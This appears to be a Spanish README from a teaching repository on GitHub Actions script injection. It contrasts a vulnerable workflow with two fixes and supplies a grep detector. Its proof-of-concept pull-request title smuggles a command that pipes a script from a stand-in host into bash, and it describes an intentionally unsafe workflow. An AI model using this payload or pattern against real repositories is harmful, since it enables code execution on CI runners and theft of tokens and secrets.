# Example 03 — Safe vs unsafe interpolation

Tres variantes del mismo workflow, mostrando la vulnerabilidad y los dos arreglos canónicos.

| Archivo | Qué es | Correrlo? |
|---------|--------|-----------|
| `unsafe.yml` | **Vulnerable**: interpola `${{ github.event.pull_request.title }}` dentro de `run:`. | **No lo subas** a un repo público; es ilustrativo. |
| `safe-envvar.yml` | Arreglo #1: pasa el título por `env:` y lo usa como `"$PR_TITLE"` en el shell. | Sí; patrón por defecto. |
| `safe-github-script.yml` | Arreglo #2: usa `actions/github-script` y lee `context.payload.pull_request.title`. | Sí; útil cuando ya estás en JS. |

## Prueba de concepto (teórica, no la hagas)

Con `unsafe.yml` instalado en un repo público, un atacante abre un PR con título:

```
foo"; curl -sfL https://evil.example/x.sh | bash; echo "
```

El shell que recibe `echo "Thanks for the PR titled: foo"; curl ...; echo ""` ejecuta el `curl`. El runner tiene `GITHUB_TOKEN` en el entorno; si el workflow usa `pull_request_target` (ver `gha-03`), tiene además los secrets del repo.

## Detector grep

Para buscar este patrón en un repo:

```bash
grep -nRE '\$\{\{\s*github\.event\.[^}]*\.(title|body|message|name|email|ref|label|description|comment)[^}]*\}\}' .github/workflows/
```

Herramientas más completas: `actionlint`, `zizmor`, `octoscan` (opcional).

## Qué hace cada arreglo

**`safe-envvar.yml`** — El valor del título vive en una env var, no en el script. El shell lo trata como dato opaco; `"$PR_TITLE"` entre comillas dobles previene re-splitting. Es la vía por defecto; funciona en cualquier shell.

**`safe-github-script.yml`** — No hay fase textual intermedia. El valor viaja dentro del objeto JavaScript `context.payload`. Útil si ya estás escribiendo JS para interactuar con la API de GitHub.
